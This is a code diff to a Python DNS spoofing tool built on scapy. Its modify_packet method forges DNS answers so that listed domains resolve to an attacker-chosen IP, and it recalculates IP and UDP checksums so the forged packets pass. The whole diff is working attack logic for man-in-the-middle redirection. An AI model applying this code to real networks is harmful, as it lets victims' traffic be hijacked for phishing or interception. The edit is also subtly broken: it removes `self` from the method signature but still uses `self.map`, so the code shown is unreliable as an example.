@@ -51,7 +51,7 @@ class DNS:
         # accept the packet
         packet.accept()
 
-    def modify_packet(self, packet):
+    def modify_packet(packet):
         """
         Modifies the DNS Resource Record `packet` ( the answer part)
         to map our globally defined `dns_hosts` dictionary.
@@ -59,39 +59,27 @@ class DNS:
         the real IP address (172.217.19.142) with fake IP address (192.168.1.100)
         """
         # get the DNS question name, the domain name
+        dns_hosts = self.map
         qname = packet[DNSQR].qname
-        if qname not in self.map:
+        if qname not in dns_hosts:
             # if the website isn't in our record
             # we don't wanna modify that
             print("no modification:", qname)
             return packet
-        else:
-            print("Did modification", qname)
-            # craft new answer, overriding the original
-            # setting the rdata for the IP we want to redirect (spoofed)
-            # for instance, google.com will be mapped to "192.168.1.100"
-            x = self.map[qname]
-            print("Loc0")
-            print(packet[DNS])
-            print("Loc1.5")
-            packet[DNS].an = DNSRR(rrname=qname, rdata=x)
-            print("Loc1")
-            # set the answer count to 1
-            packet[DNS].ancount = 1
-            print("Loc2")
-            # delete checksums and length of packet, because we have modified the packet
-            # new calculations are required ( scapy will do automatically )
-            del packet[IP].len
-            print("Loc3")
-            del packet[IP].chksum
-            print("Loc4")
-            del packet[UDP].len
-            print("Loc5")
-            del packet[UDP].chksum
-            # return the modified packet
-            print("Returning...")
-            print("Check:",packet.summary())
-            return packet
+        # craft new answer, overriding the original
+        # setting the rdata for the IP we want to redirect (spoofed)
+        # for instance, google.com will be mapped to "192.168.1.100"
+        packet[DNS].an = DNSRR(rrname=qname, rdata=dns_hosts[qname])
+        # set the answer count to 1
+        packet[DNS].ancount = 1
+        # delete checksums and length of packet, because we have modified the packet
+        # new calculations are required ( scapy will do automatically )
+        del packet[IP].len
+        del packet[IP].chksum
+        del packet[UDP].len
+        del packet[UDP].chksum
+        # return the modified packet
+        return packet
 
     def iPrint(self, text):
         if(self.use_print):
